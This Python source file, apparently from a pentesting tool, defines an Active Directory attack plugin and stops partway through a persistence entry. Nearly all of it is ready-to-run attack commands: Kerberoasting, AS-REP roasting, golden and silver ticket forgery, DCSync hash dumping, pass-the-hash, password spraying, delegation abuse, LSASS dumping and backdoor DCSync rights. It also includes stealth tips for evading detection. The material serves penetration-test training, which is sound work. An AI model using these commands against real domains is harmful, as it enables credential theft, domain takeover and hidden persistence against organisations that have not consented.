"""
Active Directory Attacks plugin

Generates comprehensive AD attack tasks including:
- Kerberos attacks (AS-REP Roasting, Kerberoasting)
- Golden/Silver ticket attacks
- Pass-the-Hash/Pass-the-Ticket attacks
- DCSync attacks
- Password spraying
- Constrained/Unconstrained delegation abuse
- Persistence mechanisms

This plugin is manually triggered (detect() returns False) and provides
educational OSCP-focused methodology for AD pentesting.

Extracted from HackTricks AD methodology documentation
Generated by: CrackPot v1.0
"""

from typing import Dict, Any, List
from .base import ServicePlugin
from .registry import ServiceRegistry


@ServiceRegistry.register
class ADAttacksPlugin(ServicePlugin):
    """Active Directory attack methodology plugin"""

    @property
    def name(self) -> str:
        return "ad-attacks"

    @property
    def default_ports(self) -> List[int]:
        return []  # Manual trigger only

    @property
    def service_names(self) -> List[str]:
        return ['ad-attacks', 'active-directory-attacks']

    def detect(self, port_info: Dict[str, Any]) -> bool:
        """Manual trigger only - returns False for auto-detection"""
        return False

    def get_task_tree(self, target: str, port: int, service_info: Dict[str, Any]) -> Dict[str, Any]:
        """Generate Active Directory attack task tree"""
        domain = service_info.get('domain', 'DOMAIN.LOCAL')
        dc_ip = service_info.get('dc_ip', target)

        tasks = {
            'id': 'ad-attacks-enum',
            'name': f'Active Directory Attacks: {domain}',
            'type': 'parent',
            'children': []
        }

        # Phase 1: Kerberos Attacks
        tasks['children'].append(self._create_kerberos_attacks(target, domain, dc_ip))

        # Phase 2: Credential Attacks
        tasks['children'].append(self._create_credential_attacks(target, domain, dc_ip))

        # Phase 3: Lateral Movement & Privilege Escalation
        tasks['children'].append(self._create_lateral_movement_attacks(target, domain, dc_ip))

        # Phase 4: Persistence Mechanisms
        tasks['children'].append(self._create_persistence_attacks(target, domain, dc_ip))

        return tasks

    def _create_kerberos_attacks(self, target: str, domain: str, dc_ip: str) -> Dict[str, Any]:
        """Kerberos-based attacks (Roasting, Tickets)"""
        return {
            'id': 'kerberos-attacks',
            'name': 'Kerberos Attacks',
            'type': 'parent',
            'children': [
                # AS-REP Roasting
                {
                    'id': 'asreproast-enum',
                    'name': 'AS-REP Roasting: Enumerate Vulnerable Users',
                    'type': 'command',
                    'metadata': {
                        'command': f'GetNPUsers.py {domain}/ -usersfile users.txt -format hashcat -outputfile hashes.asreproast -dc-ip {dc_ip}',
                        'description': 'Find users without Kerberos pre-authentication and extract AS-REP hashes',
                        'tags': ['OSCP:HIGH', 'KERBEROS', 'ENUM'],
                        'flag_explanations': {
                            f'{domain}/': 'Target domain (trailing slash for no auth)',
                            '-usersfile': 'File containing usernames to test',
                            '-format hashcat': 'Output format for hashcat cracking (mode 18200)',
                            '-outputfile': 'Save hashes to file for offline cracking',
                            '-dc-ip': 'Domain Controller IP address'
                        },
                        'success_indicators': [
                            'Hash extracted for users without pre-auth',
                            'File created: hashes.asreproast',
                            'AS-REP hash format: $krb5asrep$23$...'
                        ],
                        'failure_indicators': [
                            'KDC_ERR_C_PRINCIPAL_UNKNOWN - Invalid username',
                            'KRB_AP_ERR_SKEW - Clock skew too great (sync time)',
                            'No hashes returned - all users require pre-auth'
                        ],
                        'next_steps': [
                            'Crack hashes: hashcat -m 18200 hashes.asreproast wordlist.txt',
                            'Alternative: john --format=krb5asrep hashes.asreproast',
                            'With domain creds: GetNPUsers.py domain/user:pass -request -dc-ip <DC>',
                            'Enumerate via LDAP: bloodyAD get search --filter pre-auth disabled'
                        ],
                        'alternatives': [
                            'Windows: Get-DomainUser -PreauthNotRequired (PowerView)',
                            'Windows: .\\Rubeus.exe asreproast /format:hashcat /outfile:hashes.asreproast',
                            'MITM: ASRepCatcher relay -dc <DC_IP> (captures all AS-REP on VLAN)'
                        ],
                        'notes': 'Clock sync critical: sudo ntpdate <DC_IP>. AS-REP roasting generates Event ID 4768 (etype 0x17, preauth 0)'
                    }
                },
                # Kerberoasting
                {
                    'id': 'kerberoast-spn-enum',
                    'name': 'Kerberoasting: Enumerate SPNs',
                    'type': 'command',
                    'metadata': {
                        'command': f'GetUserSPNs.py -request -dc-ip {dc_ip} {domain}/USER:PASS -outputfile hashes.kerberoast',
                        'description': 'Request TGS tickets for service accounts (users with SPNs) for offline cracking',
                        'tags': ['OSCP:HIGH', 'KERBEROS', 'QUICK_WIN'],
                        'flag_explanations': {
                            '-request': 'Request TGS tickets for all found SPNs',
                            '-dc-ip': 'Domain Controller IP',
                            f'{domain}/USER:PASS': 'Valid domain credentials required',
                            '-outputfile': 'Save Kerberoast hashes to file'
                        },
                        'success_indicators': [
                            'Service accounts with SPNs found',
                            'TGS tickets retrieved (hash format: $krb5tgs$23$...)',
                            'File created with kerberoastable hashes'
                        ],
                        'failure_indicators': [
                            'No SPNs found - no service accounts in use',
                            'KDC_ERR_S_PRINCIPAL_UNKNOWN - SPN does not exist',
                            'Clock skew error - sync with: ntpdate <DC_IP>'
                        ],
                        'next_steps': [
                            'Crack RC4 hashes: hashcat -m 13100 hashes.kerberoast wordlist.txt',
                            'Crack AES128: hashcat -m 19600 hashes.aes128 wordlist.txt',
                            'Crack AES256: hashcat -m 19700 hashes.aes256 wordlist.txt',
                            'Target specific user: GetUserSPNs.py -request-user <SAM> ...',
                            'Enumerate only: GetUserSPNs.py (no -request flag)'
                        ],
                        'alternatives': [
                            'Windows: .\\Rubeus.exe kerberoast /outfile:hashes.kerberoast',
                            'Targeted: .\\Rubeus.exe kerberoast /user:<USERNAME> /nowrap',
                            'Stealth: .\\Rubeus.exe kerberoast /stats (gather intel first)',
                            'With hash: GetUserSPNs.py -hashes LMHASH:NTHASH domain/user',
                            'Manual: setspn.exe -Q */* (enumerate SPNs on Windows)'
                        ],
                        'notes': 'Generates Event ID 4769. RC4 ($krb5tgs$23$) faster to crack than AES. Rubeus /rc4opsec targets non-AES accounts'
                    }
                },
                # Targeted Kerberoast
                {
                    'id': 'kerberoast-targeted',
                    'name': 'Targeted Kerberoasting (GenericWrite/GenericAll)',
                    'type': 'parent',
                    'children': [
                        {
                            'id': 'targeted-kerberoast-add-spn',
                            'name': 'Add Temporary SPN to Target User',
                            'type': 'command',
                            'metadata': {
                                'command': f'targetedKerberoast.py -d {domain} -u WRITER_USER -p PASSWORD',
                                'description': 'Abuse GenericWrite/GenericAll to add SPN, roast, then cleanup',
                                'tags': ['OSCP:MEDIUM', 'KERBEROS', 'ACL_ABUSE'],
                                'flag_explanations': {
                                    '-d': 'Target domain',
                                    '-u': 'User with GenericWrite/GenericAll over target',
                                    '-p': 'Writer user password'
                                },
                                'success_indicators': [
                                    'Temporary SPN added to target user',
                                    'TGS-REP (RC4 etype 23) retrieved',
                                    'Hash output in hashcat format',
                                    'SPN removed after roasting (cleanup)'
                                ],
                                'failure_indicators': [
                                    'ACCESS_DENIED - insufficient permissions',
                                    'Target user protected (AdminSDHolder)',
                                    'SPN already exists on target'
                                ],
                                'next_steps': [
                                    'Crack hash: hashcat -m 13100 output.hash rockyou.txt',
                                    'Alternative: john --format=krb5tgs output.hash'
                                ],
                                'alternatives': [
                                    'Manual (Windows): Set-DomainObject -Identity <USER> -Set @{serviceprincipalname=\'fake/TempSvc\'} (PowerView)',
                                    'Manual: Rubeus.exe kerberoast /user:<USER> /nowrap /rc4',
                                    'Cleanup: Set-DomainObject -Identity <USER> -Clear serviceprincipalname'
                                ],
                                'notes': 'Generates Event IDs 5136 (directory modified), 4738 (user changed), 4769 (TGS request). Throttle to reduce noise'
                            }
                        }
                    ]
                },
                # Golden Ticket
                {
                    'id': 'golden-ticket',
                    'name': 'Golden Ticket Attack',
                    'type': 'parent',
                    'children': [
                        {
                            'id': 'golden-ticket-create-linux',
                            'name': 'Forge Golden Ticket (Linux)',
                            'type': 'command',
                            'metadata': {
                                'command': f'ticketer.py -nthash <KRBTGT_HASH> -domain-sid <DOMAIN_SID> -domain {domain} administrator',
                                'description': 'Create forged TGT impersonating any user using krbtgt NTLM hash',
                                'tags': ['OSCP:HIGH', 'KERBEROS', 'PERSISTENCE'],
                                'flag_explanations': {
                                    '-nthash': 'NTLM hash of krbtgt account (from DCSync/NTDS.dit)',
                                    '-domain-sid': 'Domain SID (e.g., S-1-5-21-xxx-xxx-xxx)',
                                    '-domain': 'Target domain FQDN',
                                    'administrator': 'User to impersonate (any user)'
                                },
                                'success_indicators': [
                                    'TGT file created: administrator.ccache',
                                    'Can authenticate to any service in domain',
                                    'No password/hash needed for target user'
                                ],
                                'failure_indicators': [
                                    'Invalid krbtgt hash',
                                    'Incorrect domain SID',
                                    'Clock skew issues'
                                ],
                                'next_steps': [
                                    'Export ticket: export KRB5CCNAME=$PWD/administrator.ccache',
                                    'Use with Impacket: psexec.py domain/administrator@DC -k -no-pass',
                                    'Access shares: smbclient.py -k domain/administrator@DC',
                                    'DCSync: secretsdump.py -k domain/administrator@DC -just-dc'
                                ],
                                'alternatives': [
                                    'Windows: kerberos::golden /user:Administrator /domain:<DOMAIN> /sid:<SID> /krbtgt:<HASH> /ptt (Mimikatz)',
                                    'Windows: Rubeus.exe golden /rc4:<HASH> /domain:<DOMAIN> /sid:<SID> /user:Administrator /ptt',
                                    'Use AES keys: ticketer.py -aesKey <AES256_KEY> ... (more OPSEC safe)'
                                ],
                                'notes': 'Requires DA/DCSync to get krbtgt hash. Default Mimikatz: 10yr lifetime (detectable). Use /startoffset, /endin, /renewmax for stealth. Detection: 4769 without prior 4768'
                            }
                        },
                        {
                            'id': 'golden-ticket-obtain-krbtgt',
                            'name': 'Obtain krbtgt Hash (DCSync)',
                            'type': 'command',
                            'metadata': {
                                'command': f'secretsdump.py -just-dc-user krbtgt {domain}/ADMIN:PASS@{dc_ip}',
                                'description': 'Extract krbtgt NTLM hash via DCSync for golden ticket creation',
                                'tags': ['OSCP:HIGH', 'DCSYNC'],
                                'flag_explanations': {
                                    '-just-dc-user krbtgt': 'Only dump krbtgt account hash',
                                    f'{domain}/ADMIN:PASS': 'DA or user with DCSync rights',
                                    f'@{dc_ip}': 'Target Domain Controller'
                                },
                                'success_indicators': [
                                    'krbtgt NTLM hash retrieved',
                                    'krbtgt AES keys extracted (AES128/AES256)'
                                ],
                                'next_steps': [
                                    'Create golden ticket with extracted hash',
                                    'Get domain SID: lookupsid.py domain/user:pass@DC'
                                ],
                                'alternatives': [
                                    'Windows: Invoke-Mimikatz -Command \'"lsadump::dcsync /user:krbtgt"\'',
                                    'Extract from NTDS.dit: secretsdump.py -ntds ntds.dit -system SYSTEM LOCAL'
                                ]
                            }
                        }
                    ]
                },
                # Silver Ticket
                {
                    'id': 'silver-ticket',
                    'name': 'Silver Ticket Attack',
                    'type': 'parent',
                    'children': [
                        {
                            'id': 'silver-ticket-create',
                            'name': 'Forge Silver Ticket (Service-Specific)',
                            'type': 'command',
                            'metadata': {
                                'command': f'ticketer.py -nthash <SERVICE_HASH> -domain-sid <DOMAIN_SID> -domain {domain} -spn cifs/{target} administrator',
                                'description': 'Forge TGS for specific service using service account hash',
                                'tags': ['OSCP:HIGH', 'KERBEROS', 'LATERAL_MOVEMENT'],
                                'flag_explanations': {
                                    '-nthash': 'NTLM hash of service account (e.g., machine account)',
                                    '-domain-sid': 'Domain SID',
                                    '-spn': 'Target SPN (e.g., cifs/HOST, ldap/DC, MSSQLSvc/SQL)',
                                    'administrator': 'User to impersonate'
                                },
                                'success_indicators': [
                                    'Service ticket created for target SPN',
                                    'Can access specific service as impersonated user'
                                ],
                                'failure_indicators': [
                                    'Invalid service hash',
                                    'Wrong SPN format',
                                    'Service not available'
                                ],
                                'next_steps': [
                                    'Export: export KRB5CCNAME=administrator.ccache',
                                    'CIFS: smbclient.py -k domain/administrator@target',
                                    'LDAP (DCSync): secretsdump.py -k domain/admin@DC',
                                    'MSSQL: mssqlclient.py -k domain/admin@sqlserver'
                                ],
                                'alternatives': [
                                    'Windows: mimikatz kerberos::golden /domain:<DOMAIN> /sid:<SID> /rc4:<HASH> /user:<USER> /service:<SPN> /target:<TARGET>',
                                    'Windows: Rubeus.exe asktgs /user:<USER> /rc4:<HASH> /domain:<DOMAIN> /service:<SPN> /ptt',
                                    'Any SPN works: /altservice:host,rpcss,http,ldap,cifs (SPN not validated)'
                                ],
                                'notes': 'More stealthy than Golden (only service hash needed). Common SPNs: cifs (file), host (tasks), ldap (DCSync), MSSQLSvc (SQL)'
                            }
                        },
                        {
                            'id': 'silver-ticket-services',
                            'name': 'Silver Ticket Service Reference',
                            'type': 'manual',
                            'metadata': {
                                'description': 'Common SPNs for Silver Ticket attacks',
                                'tags': ['REFERENCE', 'OSCP:MEDIUM'],
                                'alternatives': [
                                    'CIFS - File shares, PsExec access',
                                    'HOST - Scheduled tasks, WMI',
                                    'HOST+RPCSS - Full WMI access',
                                    'HTTP+HOST - PowerShell Remoting',
                                    'LDAP - DCSync, directory operations',
                                    'MSSQLSvc - SQL Server access (+ xp_cmdshell to RCE)',
                                    'WINRM/WSMAN - WinRM remote shell',
                                    'RPCSS+LDAP+CIFS - Remote Admin Tools'
                                ],
                                'notes': 'Use /altservice flag in Rubeus to request multiple SPNs from single hash'
                            }
                        }
                    ]
                },
                # Pass-the-Ticket
                {
                    'id': 'pass-the-ticket',
                    'name': 'Pass-the-Ticket (PTT)',
                    'type': 'parent',
                    'children': [
                        {
                            'id': 'ptt-linux',
                            'name': 'Pass-the-Ticket (Linux)',
                            'type': 'command',
                            'metadata': {
                                'command': f'export KRB5CCNAME=/path/to/ticket.ccache && psexec.py {domain}/user@{target} -k -no-pass',
                                'description': 'Use stolen Kerberos ticket (ccache) for authentication',
                                'tags': ['OSCP:HIGH', 'KERBEROS', 'LATERAL_MOVEMENT'],
                                'flag_explanations': {
                                    'KRB5CCNAME': 'Environment variable pointing to ccache ticket file',
                                    '-k': 'Use Kerberos authentication',
                                    '-no-pass': 'Do not prompt for password (ticket is credential)'
                                },
                                'success_indicators': [
                                    'Authenticated using ticket',
                                    'Shell access obtained',
                                    'No password required'
                                ],
                                'failure_indicators': [
                                    'Ticket expired',
                                    'Clock skew error',
                                    'Invalid ticket format'
                                ],
                                'next_steps': [
                                    'List tickets: klist (if MIT Kerberos installed)',
                                    'Convert formats: ticket_converter.py ccache kirbi',
                                    'Extract tickets from Windows: see Mimikatz/Rubeus'
                                ],
                                'alternatives': [
                                    'Windows: mimikatz kerberos::ptt ticket.kirbi',
                                    'Windows: Rubeus.exe ptt /ticket:ticket.kirbi',
                                    'Check loaded: klist (Windows)',
                                    'Harvest tickets: Rubeus.exe dump, Invoke-Mimikatz sekurlsa::tickets /export'
                                ],
                                'notes': 'Tickets extracted from LSASS (admin required) or harvested from disk. Convert .kirbi <-> .ccache with ticket_converter.py'
                            }
                        }
                    ]
                },
                # Pass-the-Key/OverPass-the-Hash
                {
                    'id': 'pass-the-key',
                    'name': 'Pass-the-Key / Overpass-the-Hash (PTK)',
                    'type': 'command',
                    'metadata': {
                        'command': f'getTGT.py {domain}/user -hashes :<NTHASH> -dc-ip {dc_ip}',
                        'description': 'Request TGT using NTLM hash or AES key (no plaintext password)',
                        'tags': ['OSCP:HIGH', 'KERBEROS', 'LATERAL_MOVEMENT'],
                        'flag_explanations': {
                            '-hashes :<NTHASH>': 'NTLM hash (format: LM:NTLM or just :NTLM)',
                            '-dc-ip': 'Domain Controller IP',
                            f'{domain}/user': 'Domain and username to request TGT for'
                        },
                        'success_indicators': [
                            'TGT requested successfully',
                            'Ticket saved to user.ccache',
                            'Can now authenticate to any service'
                        ],
                        'failure_indicators': [
                            'KDC_ERR_PREAUTH_FAILED - Invalid hash',
                            'Clock skew error - sync time',
                            'User does not exist'
                        ],
                        'next_steps': [
                            'Export ticket: export KRB5CCNAME=user.ccache',
                            'Use ticket: psexec.py domain/user@target -k -no-pass',
                            'Alternative: wmiexec.py, smbexec.py, etc. with -k -no-pass'
                        ],
                        'alternatives': [
                            'With AES256: getTGT.py -aesKey <AES256_KEY> domain/user',
                            'Windows: Rubeus.exe asktgt /user:<USER> /rc4:<HASH> /ptt',
                            'Windows: Rubeus.exe asktgt /user:<USER> /aes256:<KEY> /opsec /ptt',
                            'Stealthier: use AES256 (avoids RC4 usage detection)'
                        ],
                        'notes': 'Generates Event ID 4768 (TGT requested). AES256 preferred for OPSEC. RC4 default but flagged in modern environments'
                    }
                }
            ]
        }

    def _create_credential_attacks(self, target: str, domain: str, dc_ip: str) -> Dict[str, Any]:
        """Credential-focused attacks (Spraying, DCSync)"""
        return {
            'id': 'credential-attacks',
            'name': 'Credential Attacks',
            'type': 'parent',
            'children': [
                # Password Policy Enumeration
                {
                    'id': 'password-policy',
                    'name': 'Enumerate Password Policy',
                    'type': 'command',
                    'metadata': {
                        'command': f'crackmapexec smb {dc_ip} -u USER -p PASS --pass-pol',
                        'description': 'Get domain password policy (lockout threshold, complexity, history)',
                        'tags': ['OSCP:HIGH', 'QUICK_WIN', 'ENUM'],
                        'flag_explanations': {
                            '--pass-pol': 'Query password policy via SMB'
                        },
                        'success_indicators': [
                            'Minimum password length shown',
                            'Lockout threshold revealed',
                            'Password complexity requirements listed'
                        ],
                        'failure_indicators': [
                            'Access denied - need valid creds',
                            'SMB not available'
                        ],
                        'next_steps': [
                            'Plan spray attempts to stay under lockout threshold',
                            'Use policy info to generate targeted wordlist',
                            'Note lockout duration for throttling'
                        ],
                        'alternatives': [
                            'Linux: enum4linux -u user -p pass -P <DC>',
                            'Linux: rpcclient -U "" -N <DC> → querydominfo',
                            'Linux: ldapsearch -h <DC> -x -b "DC=domain,DC=local" | grep pwdHistoryLength',
                            'Windows: net accounts',
                            'Windows: (Get-DomainPolicy)."SystemAccess"'
                        ],
                        'notes': 'Critical before password spraying to avoid lockouts. Default: 10 failed attempts = lockout'
                    }
                },
                # Password Spraying
                {
                    'id': 'password-spray-kerbrute',
                    'name': 'Password Spraying (Kerbrute)',
                    'type': 'command',
                    'metadata': {
                        'command': f'kerbrute passwordspray -d {domain} --dc {dc_ip} users.txt Password123',
                        'description': 'Kerberos-based password spraying (low noise, no lockouts if done carefully)',
                        'tags': ['OSCP:HIGH', 'BRUTE_FORCE', 'NOISY'],
                        'flag_explanations': {
                            'passwordspray': 'Spray mode (one password against many users)',
                            '-d': 'Target domain',
                            '--dc': 'Domain Controller IP (optional but recommended)',
                            'users.txt': 'List of usernames to test',
                            'Password123': 'Single password to spray'
                        },
                        'success_indicators': [
                            'Valid credentials found: [+] user:pass',
                            'Kerberos pre-auth successful'
                        ],
                        'failure_indicators': [
                            'All attempts failed',
                            'Clock skew error - sync time',
                            'User accounts locked out (went over threshold)'
                        ],
                        'next_steps': [
                            'Validate creds: crackmapexec smb <DC> -u user -p pass',
                            'Check access: crackmapexec winrm/smb <targets> -u user -p pass',
                            'Avoid lockouts: wait lockout_duration between attempts',
                            'Try common passwords: Welcome1, Spring2024, Company123!'
                        ],
                        'alternatives': [
                            'Linux: crackmapexec smb <DC> -u users.txt -p Password123 --continue-on-success --no-bruteforce',
                            'Linux: netexec smb <DC> -u users.txt -p pass --continue-on-success',
                            'Windows: Rubeus.exe brute /users:users.txt /passwords:passes.txt /domain:<DOMAIN>',
                            'Windows: Invoke-DomainPasswordSpray -UserList users.txt -Password Password123',
                            'Stealthy: SpearSpray (PSO-aware, LDAP-driven, pattern-based)'
                        ],
                        'notes': 'Generates Event ID 4768/4771 (Kerberos). Safer than SMB/LDAP bind attempts. Always check policy first! Common patterns: Season+Year, Company+Year'
                    }
                },
                {
                    'id': 'password-spray-empty',
                    'name': 'Identify "Must Change Password" Accounts',
                    'type': 'command',
                    'metadata': {
                        'command': f'netexec smb {dc_ip} -u users.txt -p \'\' --continue-on-success',
                        'description': 'Low-noise technique to find accounts requiring password change (can be hijacked)',
                        'tags': ['OSCP:MEDIUM', 'QUICK_WIN'],
                        'flag_explanations': {
                            '-p \'\'': 'Empty password spray (benign)',
                            '--continue-on-success': 'Keep testing all users'
                        },
                        'success_indicators': [
                            'STATUS_PASSWORD_MUST_CHANGE - hijackable account found',
                            'Can change password without knowing old one'
                        ],
                        'next_steps': [
                            'Change password: netexec smb <DC> -u <USER> -p \'\' -M change-password -o NEWPASS=P@ssw0rd123!',
                            'Validate new creds: netexec smb <DC> -u <USER> -p P@ssw0rd123! --pass-pol'
                        ],
                        'alternatives': [
                            'Enumerate users first: netexec smb <DC> -u \'\' -p \'\' --rid-brute'
                        ],
                        'notes': 'Requires user enumeration via RID brute or LDAP. Clock sync required: sudo ntpdate <DC>'
                    }
                },
                # DCSync
                {
                    'id': 'dcsync-attack',
                    'name': 'DCSync Attack',
                    'type': 'parent',
                    'children': [
                        {
                            'id': 'dcsync-enum-perms',
                            'name': 'Enumerate DCSync Permissions',
                            'type': 'command',
                            'metadata': {
                                'command': f'Get-ObjectAcl -DistinguishedName "dc={domain.split(".")[0]},dc={domain.split(".")[1]}" -ResolveGUIDs | ?{{($_.ObjectType -match \'replication-get\') -or ($_.ActiveDirectoryRights -match \'GenericAll\')}}',
                                'description': 'Find users/groups with DCSync rights (Replicating Directory Changes)',
                                'tags': ['OSCP:MEDIUM', 'ENUM', 'ACL'],
                                'success_indicators': [
                                    'Users with DS-Replication-Get-Changes found',
                                    'Accounts with GenericAll over domain object'
                                ],
                                'alternatives': [
                                    'Default: Domain Admins, Enterprise Admins, Administrators, DC computer accounts',
                                    'BloodHound: path to DCSync (WriteDacl → add perms → DCSync)'
                                ],
                                'notes': 'DCSync simulates DC behavior via MS-DRSR protocol (cannot be disabled)'
                            }
                        },
                        {
                            'id': 'dcsync-dump-hashes',
                            'name': 'DCSync: Dump All Hashes',
                            'type': 'command',
                            'metadata': {
                                'command': f'secretsdump.py -just-dc {domain}/ADMIN:PASS@{dc_ip} -outputfile dcsync_hashes',
                                'description': 'Dump entire domain database (NTDS.dit) via DCSync',
                                'tags': ['OSCP:HIGH', 'DCSYNC', 'POST_EXPLOIT'],
                                'flag_explanations': {
                                    '-just-dc': 'Only DC secrets (NTLM hashes, Kerberos keys)',
                                    f'{domain}/ADMIN:PASS': 'User with DCSync rights (DA or equivalent)',
                                    '-outputfile': 'Save NTLM, Kerberos, and cleartext (if any) to files'
                                },
                                'success_indicators': [
                                    'NTLM hashes dumped for all domain users',
                                    'Kerberos AES keys extracted',
                                    'krbtgt hash obtained (for Golden Ticket)'
                                ],
                                'failure_indicators': [
                                    'Access denied - user lacks DCSync rights',
                                    'Network error - DC unreachable'
                                ],
                                'next_steps': [
                                    'Extract krbtgt: grep krbtgt dcsync_hashes.ntds',
                                    'Crack hashes: hashcat -m 1000 dcsync_hashes.ntds wordlist.txt',
                                    'Pass-the-Hash: crackmapexec smb <targets> -u admin -H <HASH>',
                                    'Create Golden Ticket with krbtgt hash'
                                ],
                                'alternatives': [
                                    'Target specific user: secretsdump.py -just-dc-user Administrator ...',
                                    'With hash: secretsdump.py -hashes <LMHASH>:<NTHASH> domain/user@DC',
                                    'Windows: Invoke-Mimikatz -Command \'"lsadump::dcsync /user:domain\\krbtgt"\'',
                                    'With captured DC TGT: KRB5CCNAME=DC$.ccache secretsdump.py -k -no-pass domain/@DC'
                                ],
                                'notes': 'Requires DA or Replication rights. Generates Event IDs 4662, 5136, 4670. Three output files: .ntds (NTLM), .ntds.kerberos (AES keys), .ntds.cleartext (reversible encryption)'
                            }
                        },
                        {
                            'id': 'dcsync-grant-persistence',
                            'name': 'DCSync Persistence: Grant Rights',
                            'type': 'command',
                            'metadata': {
                                'command': f'Add-ObjectAcl -TargetDistinguishedName "dc={domain.split(".")[0]},dc={domain.split(".")[1]}" -PrincipalSamAccountName lowpriv_user -Rights DCSync',
                                'description': 'Grant DCSync rights to controlled user for persistent access',
                                'tags': ['OSCP:MEDIUM', 'PERSISTENCE', 'ACL'],
                                'flag_explanations': {
                                    '-TargetDistinguishedName': 'Domain root object',
                                    '-PrincipalSamAccountName': 'User to grant DCSync rights',
                                    '-Rights DCSync': 'Add DS-Replication-Get-Changes permissions'
                                },
                                'success_indicators': [
                                    'Permissions added successfully',
                                    'Low-privilege user can now DCSync'
                                ],
                                'next_steps': [
                                    'Verify: Get-ObjectAcl -DistinguishedName ... | ?{$_.IdentityReference -match "lowpriv_user"}',
                                    'Use: secretsdump.py domain/lowpriv_user:pass@DC'
                                ],
                                'alternatives': [
                                    'Manual ACL modification via ADSI Edit (GUI)',
                                    'BloodHound edge: WriteDacl → DCSync'
                                ],
                                'notes': 'Stealthy persistence. User remains low-profile but has DA-equivalent access for dumping'
                            }
                        }
                    ]
                }
            ]
        }

    def _create_lateral_movement_attacks(self, target: str, domain: str, dc_ip: str) -> Dict[str, Any]:
        """Lateral movement and privilege escalation techniques"""
        return {
            'id': 'lateral-movement',
            'name': 'Lateral Movement & Privilege Escalation',
            'type': 'parent',
            'children': [
                # Constrained Delegation
                {
                    'id': 'constrained-delegation',
                    'name': 'Constrained Delegation Abuse',
                    'type': 'parent',
                    'children': [
                        {
                            'id': 'constrained-delegation-enum',
                            'name': 'Enumerate Constrained Delegation',
                            'type': 'command',
                            'metadata': {
                                'command': 'Get-DomainUser -TrustedToAuth | select userprincipalname,msds-allowedtodelegateto',
                                'description': 'Find users/computers with constrained delegation configured',
                                'tags': ['OSCP:MEDIUM', 'ENUM', 'DELEGATION'],
                                'flag_explanations': {
                                    '-TrustedToAuth': 'Query users with TrustedToAuthForDelegation flag (S4U2Self)',
                                    'msds-allowedtodelegateto': 'Target SPNs delegation is allowed to'
                                },
                                'success_indicators': [
                                    'Accounts with delegation configured found',
                                    'List of allowed SPNs shown',
                                    'msDS-AllowedToDelegateTo attribute populated'
                                ],
                                'next_steps': [
                                    'If account compromised, can impersonate any user to allowed SPNs',
                                    'SPN validation not enforced - can request ANY service (CIFS → LDAP)',
                                    'Use /altservice in Rubeus to pivot to different SPN'
                                ],
                                'alternatives': [
                                    'PowerView: Get-DomainComputer -TrustedToAuth',
                                    'ADSearch: ADSearch.exe --search "(&(objectCategory=computer)(msds-allowedtodelegateto=*))"',
                                    'BloodHound: AllowedToDelegate edge'
                                ]
                            }
                        },
                        {
                            'id': 'constrained-delegation-exploit',
                            'name': 'Abuse Constrained Delegation (S4U2Proxy)',
                            'type': 'command',
                            'metadata': {
                                'command': f'Rubeus.exe s4u /user:sqlservice /rc4:<HASH> /impersonateuser:Administrator /msdsspn:CIFS/{target} /altservice:LDAP /ptt',
                                'description': 'Obtain TGS impersonating admin to any service via constrained delegation',
                                'tags': ['OSCP:HIGH', 'DELEGATION', 'PRIVESC'],
                                'flag_explanations': {
                                    '/user': 'Service account with constrained delegation enabled',
                                    '/rc4': 'NTLM hash of delegation-enabled account',
                                    '/impersonateuser': 'User to impersonate (S4U2Self)',
                                    '/msdsspn': 'Target SPN (from msDS-AllowedToDelegateTo)',
                                    '/altservice': 'Pivot to different service (SPN not validated!)',
                                    '/ptt': 'Pass-the-Ticket (load in memory automatically)'
                                },
                                'success_indicators': [
                                    'TGS obtained for administrator@domain to target SPN',
                                    'Ticket loaded in memory',
                                    'Can access service as administrator'
                                ],
                                'failure_indicators': [
                                    'User is sensitive and cannot be delegated (protected)',
                                    'Invalid hash for delegation account',
                                    'SPN not in allowed list (still works with /altservice!)'
                                ],
                                'next_steps': [
                                    'If LDAP access obtained: DCSync via LDAP service',
                                    'If CIFS: Access C$ and ADMIN$ shares',
                                    'If HOST: Create scheduled tasks, use WMI',
                                    'Combine with /altservice:host,rpcss,http,ldap,cifs for multiple SPNs'
                                ],
                                'alternatives': [
                                    'Step-by-step: 1) Get TGT, 2) S4U2Self, 3) S4U2Proxy',
                                    'With AES: /aes256:<KEY>',
                                    'Kekeo: tgs::s4u /tgt:... /user:Administrator@domain /service:...'
                                ],
                                'notes': 'SPN not cryptographically validated - CIFS SPN can become LDAP (DCSync)! Protected users cannot be impersonated'
                            }
                        }
                    ]
                },
                # Pass-the-Hash
                {
                    'id': 'pass-the-hash',
                    'name': 'Pass-the-Hash (PTH)',
                    'type': 'command',
                    'metadata': {
                        'command': f'crackmapexec smb {target} -u Administrator -H <NTLM_HASH>',
                        'description': 'Authenticate using NTLM hash instead of password',
                        'tags': ['OSCP:HIGH', 'LATERAL_MOVEMENT', 'QUICK_WIN'],
                        'flag_explanations': {
                            '-H': 'NTLM hash (format: LM:NTLM or just NTLM)',
                            '-u': 'Username',
                            'smb': 'Protocol to test (smb, winrm, ldap, mssql)'
                        },
                        'success_indicators': [
                            '(Pwn3d!) - Local admin access',
                            '[+] - Valid credentials',
                            'Can execute commands with -x flag'
                        ],
                        'failure_indicators': [
                            'STATUS_LOGON_FAILURE - Invalid hash',
                            'SMB signing required (PTH may fail)',
                            'Account disabled or expired'
                        ],
                        'next_steps': [
                            'Spray hash: crackmapexec smb <subnet> -u admin -H <HASH> --local-auth',
                            'Execute command: crackmapexec smb <target> -u admin -H <HASH> -x whoami',
                            'Dump SAM: crackmapexec smb <target> -u admin -H <HASH> --sam',
                            'Dump LSASS: crackmapexec smb <target> -u admin -H <HASH> -M lsassy'
                        ],
                        'alternatives': [
                            'Impacket: psexec.py -hashes <HASH> domain/admin@target',
                            'Impacket: wmiexec.py -hashes <HASH> admin@target',
                            'Evil-WinRM: evil-winrm -i <IP> -u admin -H <HASH>',
                            'Mimikatz: sekurlsa::pth /user:admin /ntlm:<HASH> /domain:. /run:cmd'
                        ],
                        'notes': 'Works with local accounts (often reused across machines) and domain accounts. Obtain hashes from: SAM, LSASS, DCSync, secretsdump'
                    }
                }
            ]
        }

    def _create_persistence_attacks(self, target: str, domain: str, dc_ip: str) -> Dict[str, Any]:
        """Persistence mechanisms in Active Directory"""
        return {
            'id': 'persistence-mechanisms',
            'name': 'Persistence Mechanisms',
            'type': 'parent',
            'children': [
                # AdminSDHolder
                {
                    'id': 'adminsdholder-persistence',
                    'name': 'AdminSDHolder Persistence',
                    'type': 'manual',
                    'metadata': {
                        'description': 'Add user to AdminSDHolder for persistent DA-level permissions',
